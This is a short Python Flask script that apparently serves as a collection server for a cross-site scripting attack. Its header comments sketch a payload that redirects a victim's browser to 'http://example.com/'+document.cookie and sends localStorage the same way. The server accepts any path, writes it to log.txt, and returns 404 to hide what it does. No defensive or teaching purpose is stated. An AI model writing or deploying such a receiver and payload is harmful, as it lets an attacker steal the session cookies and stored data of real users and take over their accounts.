# ideas
# 1. set location to "http://example.com/"+document.cookie
# 2. do the same for localstorage if not too big (8kb)
# 3. log anything ig

from flask import Flask, abort

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def lol(path):
   with open('log.txt', 'a') as lmao:
       lmao.write(f'{path}\n')
   abort(404) # smartass

if __name__ == '__main__':
    app.run()
